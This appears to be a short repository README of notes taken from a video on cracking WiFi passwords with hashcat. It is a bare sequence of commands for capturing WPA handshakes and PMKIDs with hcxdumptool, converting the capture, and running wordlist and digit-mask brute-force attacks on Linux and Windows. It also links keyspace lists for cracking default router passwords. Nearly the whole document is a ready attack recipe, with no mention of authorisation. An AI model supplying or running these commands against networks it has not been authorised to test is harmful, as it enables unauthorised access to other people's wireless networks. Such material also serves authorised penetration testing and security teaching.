# WiFi-Cracking-with-HashCat
Cat: Security

Hashcat wifi cracking from David Bombal's video

https://www.youtube.com/watch?v=Usw0IlGbkC4&t=915s

## COMMANDS

### Stop Network Manager and WPA Supplicant Services
```
sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant
```

### Run hcxdumptool to capture WLAN information
```
sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=1
```

### Restart Network Manager and WPA Supplicant Services
```
sudo systemctl start wpa_supplicant && sudo systemctl start NetworkManager
```

### Convert PCAPNG file to hash file
```
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```

### Capture MAC addresses
```
hcxdumptool --do_rcascan -i wlan0
```

### Run Hashcat with a wordlist
```
hashcat -m 22000 hash.hc22000 wordlist.txt
```
### Run Hashcat with Brute Force
```
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

hashcat -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
```
## Windows:
```
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
```
hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
```


Usefull repositories for routers with default passwords.

https://github.com/sheimo/Wifi-WPA-Keyspace-List

https://github.com/n0kovo/ssid-keyspace-table
